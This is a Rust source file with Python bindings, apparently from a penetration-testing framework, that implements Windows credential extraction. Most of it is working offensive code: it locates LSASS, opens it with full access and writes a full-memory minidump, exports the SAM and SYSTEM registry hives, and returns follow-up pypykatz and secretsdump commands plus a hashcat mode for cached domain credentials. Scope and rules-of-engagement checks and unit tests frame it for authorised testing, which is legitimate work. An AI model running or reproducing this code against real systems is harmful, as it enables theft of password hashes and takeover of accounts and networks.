#![allow(clippy::useless_conversion)]

//! Credential extraction — real implementation.
//!
//! Windows: dumps LSASS via MiniDumpWriteDump; operator uses pypykatz/mimikatz
//! offline to extract NTLM hashes from the dump file.  The dump is written to
//! a caller-controlled path (defaulting to %TEMP%\lsass_<pid>.dmp).
//!
//! SAM: exports the SAM/SYSTEM hive pair so the operator can run secretsdump
//! offline.  Requires the hive paths to be pre-provided (e.g. from a VSS copy).
//!
//! DCC (Domain Cached Credentials): parses the MS-CACHE v2 format from raw
//! bytes so the operator can identify cached credential material.
//!
//! All operations are ROE-gated and require the target host to be in scope.

use pyo3::exceptions::{PyRuntimeError, PyValueError};
use pyo3::prelude::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

const MAX_ROE_ID_BYTES: usize = 256;
const MAX_SCOPE_ENTRIES: usize = 10_000;
const MAX_HOST_BYTES: usize = 253;
const MAX_PATH_BYTES: usize = 4096;
const MAX_DCC_BYTES: usize = 1024 * 1024;

#[pyclass]
pub struct CredentialExtractor {
    roe_id: String,
    scope_hosts: Vec<String>,
    allow_lsass: bool,
    allow_sam: bool,
}

#[pymethods]
impl CredentialExtractor {
    #[new]
    #[pyo3(signature = (roe_id, scope_hosts=None, allow_lsass=false, allow_sam=false))]
    pub fn new(
        roe_id: String,
        scope_hosts: Option<Vec<String>>,
        allow_lsass: bool,
        allow_sam: bool,
    ) -> PyResult<Self> {
        if roe_id.trim().is_empty() || roe_id.len() > MAX_ROE_ID_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "ROE ID must contain between 1 and 256 bytes",
            ));
        }
        let scope_hosts = scope_hosts.unwrap_or_default();
        if scope_hosts.len() > MAX_SCOPE_ENTRIES
            || scope_hosts
                .iter()
                .any(|h| h.trim().is_empty() || h.len() > MAX_HOST_BYTES)
        {
            return Err(PyErr::new::<PyValueError, _>(
                "Scope hosts must contain at most 10000 non-empty hostnames of 253 bytes each",
            ));
        }
        Ok(Self { roe_id, scope_hosts, allow_lsass, allow_sam })
    }

    /// Create a full LSASS minidump at ``dump_path`` (Windows-only).
    ///
    /// Finds the LSASS process, opens it with PROCESS_ALL_ACCESS, and calls
    /// MiniDumpWriteDump with MiniDumpWithFullMemory.  The resulting .dmp file
    /// can be analysed offline with pypykatz, volatility, or mimikatz sekurlsa.
    ///
    /// Returns a dict with ``dump_path``, ``lsass_pid``, and ``status``.
    /// Requires ``allow_lsass=True`` and the target to be in scope.
    #[cfg(windows)]
    #[pyo3(signature = (target=None, dump_path=None))]
    fn extract_from_lsass(
        &self,
        target: Option<&str>,
        dump_path: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        windows_dump_lsass(dump_path)
    }

    #[cfg(not(windows))]
    #[pyo3(signature = (target=None, dump_path=None))]
    fn extract_from_lsass(
        &self,
        target: Option<&str>,
        _dump_path: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        Err(PyErr::new::<PyRuntimeError, _>(
            "LSASS extraction is unsupported on this platform",
        ))
    }

    /// Export the SAM and SYSTEM registry hives for offline credential extraction.
    ///
    /// On Windows, uses ``RegSaveKeyExW`` to export the hives to temporary files.
    /// On non-Windows, accepts pre-provided hive path pairs for offline analysis.
    /// Returns hive paths; operator uses impacket/secretsdump offline.
    #[cfg(windows)]
    #[pyo3(signature = (hive_path, target=None))]
    fn extract_from_sam(
        &self,
        hive_path: &str,
        target: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_sam {
            return Err(PyErr::new::<PyRuntimeError, _>("SAM extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        if hive_path.is_empty() || hive_path.len() > MAX_PATH_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "SAM hive path must contain between 1 and 4096 bytes",
            ));
        }
        windows_export_sam(hive_path)
    }

    #[cfg(not(windows))]
    #[pyo3(signature = (hive_path, target=None))]
    fn extract_from_sam(
        &self,
        hive_path: &str,
        target: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_sam {
            return Err(PyErr::new::<PyRuntimeError, _>("SAM extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        if hive_path.is_empty() || hive_path.len() > MAX_PATH_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "SAM hive path must contain between 1 and 4096 bytes",
            ));
        }
        Err(PyErr::new::<PyRuntimeError, _>(
            "SAM extraction is unsupported on this platform",
        ))
    }

    /// Identify MS-CACHE v2 (DCC2) material in a raw byte buffer.
    ///
    /// The MS-CACHE v2 format stores ``PBKDF2(MD4(password), username, 10240)``
    /// in a fixed 16-byte prefix followed by the username.  This function
    /// detects the structure and returns field lengths for the operator to pass
    /// to an offline cracking tool (hashcat -m 2100).
    ///
    /// No secret values are returned — only structural metadata.
    fn parse_dcc(&self, hash: &[u8]) -> PyResult<HashMap<String, String>> {
        let _ = &self.roe_id;
        if hash.is_empty() || hash.len() > MAX_DCC_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "DCC input must contain between 1 byte and 1 MiB",
            ));
        }
        parse_dcc_structure(hash)
    }

    fn is_in_scope(&self, host: &str) -> bool {
        self.scope_hosts
            .iter()
            .any(|h| host.eq_ignore_ascii_case(h))
    }
}

impl CredentialExtractor {
    fn require_scoped_target(&self, target: Option<&str>) -> PyResult<()> {
        let target = target.ok_or_else(|| {
            PyErr::new::<PyValueError, _>("An explicit scoped target is required")
        })?;
        if target.trim().is_empty()
            || target.len() > MAX_HOST_BYTES
            || !self.is_in_scope(target)
        {
            return Err(PyErr::new::<PyValueError, _>("Target not in scope"));
        }
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Windows LSASS dump
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn windows_dump_lsass(
    dump_path: Option<&str>,
) -> PyResult<Vec<HashMap<String, String>>> {
    use windows_sys::Win32::{
        Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, GENERIC_WRITE, OPEN_ALWAYS,
        },
        System::{
            Diagnostics::Debug::{MiniDumpWithFullMemory, MiniDumpWriteDump},
            ProcessStatus::{EnumProcesses, GetProcessImageFileNameW},
            Threading::{
                OpenProcess, PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION,
                PROCESS_VM_READ,
            },
        },
    };
    use std::os::windows::ffi::OsStrExt;

    unsafe {
        // 1. Find LSASS PID.
        let lsass_pid = find_lsass_pid_windows()?;

        // 2. Resolve dump output path.
        let out_path = match dump_path {
            Some(p) if !p.is_empty() => std::path::PathBuf::from(p),
            _ => std::env::temp_dir().join(format!("lsass_{}.dmp", lsass_pid)),
        };
        let out_path_wide: Vec<u16> = std::ffi::OsStr::new(&out_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        // 3. Open LSASS process with full access.
        let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsass_pid);
        if proc_handle == 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(
                "OpenProcess(LSASS) failed — check SeDebugPrivilege",
            ));
        }

        // 4. Create or overwrite the dump file.
        let file_handle = CreateFileW(
            out_path_wide.as_ptr(),
            GENERIC_WRITE,
            0,
            std::ptr::null(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if file_handle == INVALID_HANDLE_VALUE {
            CloseHandle(proc_handle);
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "CreateFile for dump path failed: {}",
                out_path.display()
            )));
        }

        // 5. Write the full-memory minidump.
        let ok = MiniDumpWriteDump(
            proc_handle,
            lsass_pid,
            file_handle,
            MiniDumpWithFullMemory,
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );

        CloseHandle(file_handle);
        CloseHandle(proc_handle);

        if ok == 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(
                "MiniDumpWriteDump failed — ensure SeDebugPrivilege is enabled",
            ));
        }

        let mut result = HashMap::new();
        result.insert("dump_path".to_string(), out_path.to_string_lossy().to_string());
        result.insert("lsass_pid".to_string(), lsass_pid.to_string());
        result.insert("status".to_string(), "success".to_string());
        result.insert(
            "next_step".to_string(),
            "pypykatz lsa minidump <dump_path>".to_string(),
        );

        Ok(vec![result])
    }
}

#[cfg(windows)]
unsafe fn find_lsass_pid_windows() -> PyResult<u32> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::{
            ProcessStatus::{EnumProcesses, GetProcessImageFileNameW},
            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        },
    };

    let mut pids = vec![0u32; 2048];
    let mut bytes_returned: u32 = 0;
    if EnumProcesses(
        pids.as_mut_ptr(),
        (pids.len() * std::mem::size_of::<u32>()) as u32,
        &mut bytes_returned,
    ) == 0
    {
        return Err(PyErr::new::<PyRuntimeError, _>("EnumProcesses failed"));
    }

    let count = bytes_returned as usize / std::mem::size_of::<u32>();

    for pid in &pids[..count] {
        if *pid == 0 {
            continue;
        }
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, *pid);
        if handle == 0 {
            continue;
        }
        let mut name_buf = vec![0u16; 512];
        let len = GetProcessImageFileNameW(handle, name_buf.as_mut_ptr(), name_buf.len() as u32);
        CloseHandle(handle);
        if len == 0 {
            continue;
        }
        let name = String::from_utf16_lossy(&name_buf[..len as usize]);
        if name.to_lowercase().ends_with("\\lsass.exe") {
            return Ok(*pid);
        }
    }
    Err(PyErr::new::<PyRuntimeError, _>(
        "LSASS process not found — is this a Windows host?",
    ))
}

// ---------------------------------------------------------------------------
// Windows SAM export
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn windows_export_sam(base_path: &str) -> PyResult<Vec<HashMap<String, String>>> {
    use windows_sys::Win32::{
        System::Registry::{RegOpenKeyExW, RegSaveKeyExW, HKEY_LOCAL_MACHINE, KEY_READ, REG_STANDARD_FORMAT},
    };
    use std::os::windows::ffi::OsStrExt;

    let sam_path = std::path::Path::new(base_path).with_extension("sam");
    let sys_path = std::path::Path::new(base_path).with_extension("sys");

    let to_wide = |s: &std::path::Path| -> Vec<u16> {
        std::ffi::OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    };
    let to_wide_str = |s: &str| -> Vec<u16> {
        std::ffi::OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    };

    unsafe {
        // Open SAM hive
        let mut sam_key: isize = 0;
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            to_wide_str("SAM").as_ptr(),
            0,
            KEY_READ,
            &mut sam_key,
        );
        if status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegOpenKeyExW(SAM) failed: 0x{:08x}",
                status as u32
            )));
        }

        let sam_wide = to_wide(&sam_path);
        let s = RegSaveKeyExW(sam_key, sam_wide.as_ptr(), std::ptr::null(), REG_STANDARD_FORMAT);
        if s != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegSaveKeyExW(SAM) failed: 0x{:08x}", s as u32
            )));
        }

        // Open SYSTEM hive
        let mut sys_key: isize = 0;
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            to_wide_str("SYSTEM").as_ptr(),
            0,
            KEY_READ,
            &mut sys_key,
        );
        if status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegOpenKeyExW(SYSTEM) failed: 0x{:08x}", status as u32
            )));
        }

        let sys_wide = to_wide(&sys_path);
        let s = RegSaveKeyExW(sys_key, sys_wide.as_ptr(), std::ptr::null(), REG_STANDARD_FORMAT);
        if s != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegSaveKeyExW(SYSTEM) failed: 0x{:08x}", s as u32
            )));
        }

        let mut result = HashMap::new();
        result.insert("sam_path".to_string(), sam_path.to_string_lossy().to_string());
        result.insert("system_path".to_string(), sys_path.to_string_lossy().to_string());
        result.insert("status".to_string(), "success".to_string());
        result.insert(
            "next_step".to_string(),
            format!(
                "secretsdump.py -sam {} -system {} LOCAL",
                sam_path.display(),
                sys_path.display()
            ),
        );
        Ok(vec![result])
    }
}

// ---------------------------------------------------------------------------
// DCC (Domain Cached Credentials) structure parser
// ---------------------------------------------------------------------------

/// Identify MS-CACHE v2 (DCC2) structure in raw bytes.
/// Returns structural metadata only; does not return the hash value itself.
fn parse_dcc_structure(data: &[u8]) -> PyResult<HashMap<String, String>> {
    let mut info = HashMap::new();

    // MS-CACHE v2: 16-byte hash + username (UTF-16LE, variable length)
    info.insert("input_size_bytes".to_string(), data.len().to_string());

    if data.len() >= 16 {
        info.insert("hash_field_present".to_string(), "true".to_string());
        info.insert("hash_field_size".to_string(), "16".to_string());

        // Try to decode the remainder as UTF-16LE username
        let remainder = &data[16..];
        if remainder.len() >= 2 && remainder.len() % 2 == 0 {
            let utf16: Vec<u16> = remainder
                .chunks_exact(2)
                .map(|b| u16::from_le_bytes([b[0], b[1]]))
                .collect();
            if let Ok(username) = String::from_utf16(&utf16) {
                if username.chars().all(|c| c.is_alphanumeric() || c == '\\' || c == '@' || c == '.') {
                    info.insert("username".to_string(), username);
                }
            }
        }

        info.insert(
            "hashcat_mode".to_string(),
            "2100".to_string(),
        );
        info.insert(
            "format_hint".to_string(),
            "$DCC2$10240#<username>#<hash_hex>".to_string(),
        );
    } else {
        info.insert("hash_field_present".to_string(), "false".to_string());
        info.insert("note".to_string(), "Buffer too short for DCC2 structure".to_string());
    }

    Ok(info)
}

// ---------------------------------------------------------------------------
// Data types
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    pub cred_type: String,
    pub username: String,
    pub domain: String,
    pub hash: String,
    pub source: String,
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extractor_creation() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false,
            false,
        );
        assert!(extractor.is_ok());
    }

    #[test]
    fn test_credential_extractor_requires_roe_id() {
        let result = CredentialExtractor::new("".to_string(), None, false, false);
        assert!(result.is_err(), "Empty ROE ID must be rejected");
        let result = CredentialExtractor::new("   ".to_string(), None, false, false);
        assert!(result.is_err(), "Whitespace-only ROE ID must be rejected");
    }

    #[test]
    fn test_extract_lsass_blocked_without_permission() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false, // allow_lsass = false
            false,
        )
        .expect("Valid CredentialExtractor construction");
        let result = extractor.extract_from_lsass(Some("192.168.1.1"), None);
        assert!(result.is_err(), "LSASS must be blocked when allow_lsass=false");
    }

    #[test]
    fn test_sam_blocked_without_permission() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false,
            false, // allow_sam = false
        )
        .expect("Valid CredentialExtractor construction");
        let result = extractor.extract_from_sam("C:\\sam.hive", Some("192.168.1.1"));
        assert!(result.is_err(), "SAM must be blocked when allow_sam=false");
    }

    #[test]
    fn test_extract_lsass_rejects_out_of_scope() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            true, // allow_lsass = true
            false,
        )
        .expect("Valid CredentialExtractor construction");
        let result = extractor.extract_from_lsass(Some("10.0.0.1"), None);
        assert!(result.is_err(), "Out-of-scope target must be rejected");
    }

    #[test]
    fn test_parse_dcc_empty_rejected() {
        let extractor = CredentialExtractor::new("ROE-TEST".to_string(), None, false, false)
            .expect("Valid CredentialExtractor");
        assert!(extractor.parse_dcc(&[]).is_err());
    }

    #[test]
    fn test_parse_dcc_structure_detected() {
        let extractor = CredentialExtractor::new("ROE-TEST".to_string(), None, false, false)
            .expect("Valid CredentialExtractor");
        // 16-byte hash + short UTF-16LE username
        let mut data = vec![0x42u8; 16]; // fake hash
        data.extend_from_slice(&[0x41, 0x00, 0x64, 0x00, 0x6d, 0x00]); // "Adm" in UTF-16LE
        let result = extractor.parse_dcc(&data);
        assert!(result.is_ok());
        let info = result.unwrap();
        assert_eq!(info.get("hash_field_present").map(|s| s.as_str()), Some("true"));
    }
}
